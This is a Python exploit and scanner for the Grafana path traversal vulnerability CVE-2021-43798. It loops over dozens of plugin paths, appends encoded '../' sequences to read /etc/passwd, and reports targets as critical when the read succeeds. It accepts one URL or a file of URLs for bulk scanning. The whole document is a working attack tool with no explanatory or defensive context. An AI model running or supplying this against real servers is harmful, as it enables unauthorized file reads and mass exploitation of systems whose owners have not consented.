# -*- coding:utf-8 -*-

import requests
import argparse
import time

# color
white = '\033[97m'
green = '\033[92m'
red = '\033[91m'
yellow = '\033[93m'

print('%s\nCVE-2021-43798  %sV1.1.0\n%s' % (green, red, white))
payload = ['/public/plugins/alertGroups/', '/public/plugins/alertlist/', '/public/plugins/icon/', '/public/plugins/alertmanager/', '/public/plugins/annolist/', '/public/plugins/barchart/', '/public/plugins/bargauge/', '/public/plugins/canvas/', '/public/plugins/cloudwatch/', '/public/plugins/dashboard/', '/public/plugins/dashlist/', '/public/plugins/debug/', '/public/plugins/elasticsearch/', '/public/plugins/gauge/', '/public/plugins/geomap/', '/public/plugins/gettingstarted/', '/public/plugins/grafana-azure-monitor-datasource/', '/public/plugins/grafana/', '/public/plugins/graph/', '/public/plugins/graphite/', '/public/plugins/heatmap/', '/public/plugins/histogram/', '/public/plugins/influxdb/', '/public/plugins/jaeger/', '/public/plugins/live/', '/public/plugins/logs/', '/public/plugins/loki/', '/public/plugins/mixed/', '/public/plugins/mssql/', '/public/plugins/mysql/', '/public/plugins/news/', '/public/plugins/nodeGraph/', '/public/plugins/opentsdb/', '/public/plugins/piechart/', '/public/plugins/pluginlist/', '/public/plugins/postgres/', '/public/plugins/prometheus/', '/public/plugins/stat/', '/public/plugins/state-timeline/', '/public/plugins/status-history/', '/public/plugins/table-old/', '/public/plugins/table/', '/public/plugins/tempo/', '/public/plugins/testdata/', '/public/plugins/text/', '/public/plugins/timeseries/', '/public/plugins/welcome/', '/public/plugins/xychart/', '/public/plugins/zipkin/']

parser = argparse.ArgumentParser(description='Example: python3 CVE-2021-43798.py -u http://example.com')
parser.add_argument('-u', '--url', help='Input url.', dest='target')
parser.add_argument('-r', '--file', help='Input file path. /-r example.txt', dest='path')
args = parser.parse_args()
target = args.target
path = args.path


def verify(url):  # Verify vulnerability
    if url[-1] == '/':
        url = url[:-1]
    if "http" not in url:
        url = "http://" + url
    for temp in payload:  # matching payload
        try:
            request = requests.get(url=url + temp + '..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd', timeout=2)
            if request.status_code == 200 and "root" in request.text:
                print('%s[' % white, end='')
                print(time.strftime("%Y-%m-%d-%H_%M_%S", time.localtime()), end='')
                print('%s] [' % white, end='')
                print('%sGrafana-File-Read' % green, end='')
                print('%s] [' % white, end='')
                print('%sCRITICAL' % red, end='')
                print('%s] [' % white, end='')
                print('url = ' + url + temp + '..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd]')
                return
        except requests.RequestException:
            print(url + ':%sConnection Error!%s' % (red, white))
            return
    print(url + ' no Grafana-File-Read!')


def earth():  # Processing requests
    if target:
        verify(target)
    elif path:
        try:
            file = open(path, 'r')
            for line in file:
                if line == '''\n''':   # Handle returns in url
                    continue
                else:
                    if '''\n''' in line:
                        line = line[:-1]
                    verify(line)
                    time.sleep(1)
        except FileNotFoundError:
            print('%sPlease input correct file path.%s' % (red, white))


if __name__ == "__main__":
    try:
        earth()
        time.sleep(1)
    except KeyboardInterrupt as e:  # handle ^C input from keyboard
        print(time.strftime("%Y-%m-%d-%H_%M_%S", time.localtime()) % red + '%sStop scanning%s' % (red, white))
